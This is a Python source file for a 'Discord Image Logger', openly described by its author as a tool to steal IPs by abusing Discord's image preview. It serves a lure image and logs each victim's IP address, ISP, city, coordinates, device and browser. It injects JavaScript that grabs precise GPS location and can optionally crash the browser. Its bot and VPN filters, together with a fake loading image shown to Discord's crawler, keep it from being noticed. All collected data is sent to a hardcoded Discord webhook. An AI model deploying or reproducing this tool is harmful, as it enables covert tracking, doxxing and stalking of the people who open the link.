# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1517531357813801032/-E4RJW8dGsRHI999R0UTrngXGSMLkD2D_FLxtgrYU_YDY2i4C4h-P82J6Ty5wXwsUxk7",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
